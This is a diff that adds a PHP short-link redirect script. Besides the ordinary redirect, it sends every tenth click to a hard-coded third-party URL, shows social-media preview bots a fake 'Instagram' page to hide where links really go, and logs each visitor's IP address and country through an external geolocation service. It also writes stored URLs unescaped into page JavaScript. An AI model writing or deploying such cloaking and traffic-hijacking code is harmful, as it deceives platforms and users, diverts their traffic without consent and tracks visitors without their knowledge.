@@ -1,0 +1,92 @@
+<?php
+ini_set('display_errors', 0);
+error_reporting(0);
+
+// 🔗 Get code from URL
+$code = $_GET['code'] ?? basename($_SERVER['REQUEST_URI']);
+$dataFile  = __DIR__ . '/api/urls.json';
+$statsFile = __DIR__ . '/stats.json';
+$fallbackUrl = "https://accorduntiltramp.com/nifep5ggv?key=2abe1c38493921c9b9c5997964d662d3";
+
+// ⚠️ Check file exists
+if (!file_exists($dataFile)) {
+  http_response_code(500);
+  echo "Storage file missing";
+  exit;
+}
+
+// 📦 Load stored URLs
+$data = json_decode(file_get_contents($dataFile), true);
+if (!isset($data[$code]['url'])) {
+  http_response_code(404);
+  echo "404 - URL not found";
+  exit;
+}
+
+$mainUrl = $data[$code]['url'];
+
+
+$data[$code]['clicks'] = ($data[$code]['clicks'] ?? 1) + 1;
+$clicks = $data[$code]['clicks'];
+file_put_contents($dataFile, json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
+
+
+$target = ($clicks % 10 === 0) ? $fallbackUrl : $mainUrl;
+
+// 🤖 Bot detection by User Agent
+$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+$botList = [
+  'facebookexternalhit','Facebot','Twitterbot','TelegramBot',
+  'Slackbot','WhatsApp','Discordbot','LinkedInBot','Pinterest'
+];
+$isBot = false;
+foreach ($botList as $bot) {
+  if (stripos($ua, $bot) !== false) {
+    $isBot = true;
+    break;
+  }
+}
+
+
+$ip = $_SERVER['REMOTE_ADDR'];
+$geo = @json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);
+$country = $geo['country'] ?? 'Unknown';
+
+// 🗂️ Log stats
+$stats = file_exists($statsFile) ? json_decode(file_get_contents($statsFile), true) : [];
+$stats[] = ['code'=>$code, 'ip'=>$ip, 'country'=>$country, 'time'=>time()];
+file_put_contents($statsFile, json_encode($stats, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
+
+
+if ($isBot) {
+  echo "<!DOCTYPE html><html><head><meta charset='UTF-8'>
+  <title>Instagram</title>
+  <meta property='og:title' content=''>
+  <meta property='og:description' content=''>
+  <meta property='og:image' content=''>
+  <meta property='og:type' content=''>
+  <meta property='og:url' content='https://www.instagram.com'>
+  <style>body{font-family:sans-serif;text-align:center;margin-top:100px;}</style>
+  </head><body><p>Instagram </p></body></html>";
+  exit;
+}
+
+
+echo "<!DOCTYPE html>
+<html>
+<head>
+  <meta charset='UTF-8'>
+  <title></title>
+  <meta name='description' content=''>
+  <script>
+    setTimeout(() => { window.location.href = '$target'; }, 1000);
+  </script>
+  <style>
+    body { font-family: sans-serif; text-align: center; margin-top: 100px; }
+  </style>
+</head>
+<body>
+
+</body>
+</html>";
+?>
